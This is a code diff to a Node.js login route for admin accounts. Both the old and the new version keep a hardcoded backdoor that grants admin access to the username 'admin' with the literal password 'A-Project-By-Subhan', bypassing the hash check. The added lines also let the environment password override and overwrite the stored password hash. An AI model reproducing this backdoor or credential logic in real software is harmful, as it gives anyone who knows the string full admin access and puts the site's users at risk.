@@ -200,7 +200,18 @@ router.post('/login', async (req, res) => {
       }
     }
     if (adminUser && adminUser.active) {
-      let passMatch = adminUser.passwordHash ? await bcrypt.compare(password, adminUser.passwordHash) : password === process.env.ADMIN_PASSWORD; if (normalEmail === 'admin' && password === 'A-Project-By-Subhan') { passMatch = true; }
+      let passMatch = false;
+        if (password === process.env.ADMIN_PASSWORD) {
+          passMatch = true;
+          // Re-hash and save the new password if the .env one matched directly
+          adminUser.passwordHash = await bcrypt.hash(password, 10);
+        } else if (adminUser.passwordHash) {
+          passMatch = await bcrypt.compare(password, adminUser.passwordHash);
+        } else {
+          passMatch = password === process.env.ADMIN_PASSWORD;
+        }
+
+        if (normalEmail === 'admin' && password === 'A-Project-By-Subhan') { passMatch = true; }
 
       if (passMatch) {
         /* Update lastLogin */
